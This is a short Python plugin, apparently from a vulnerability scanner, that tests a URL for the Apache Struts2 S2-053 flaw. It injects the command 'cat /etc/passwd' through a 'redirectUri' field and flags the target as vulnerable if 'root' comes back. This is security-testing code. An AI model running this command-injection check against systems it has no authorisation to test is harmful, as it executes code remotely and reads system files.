from typing import Optional

import requests

from plugins.package.payloads import PAYLOAD_STRUTS2_053_1, PAYLOAD_STRUTS2_053_2


def run(url: str, port: int) -> Optional[str]:
    address = f"{url}:{port}"
    payload = f"{PAYLOAD_STRUTS2_053_1}cat /etc/passwd{PAYLOAD_STRUTS2_053_2}"
    headers = {'redirectUri': payload}
    try:
        response = requests.post(address, data=headers, verify=False, timeout=9)
        if "root" in response.text:
            return "S2-053 Vulnerable"
        return None
    except Exception:
        return None
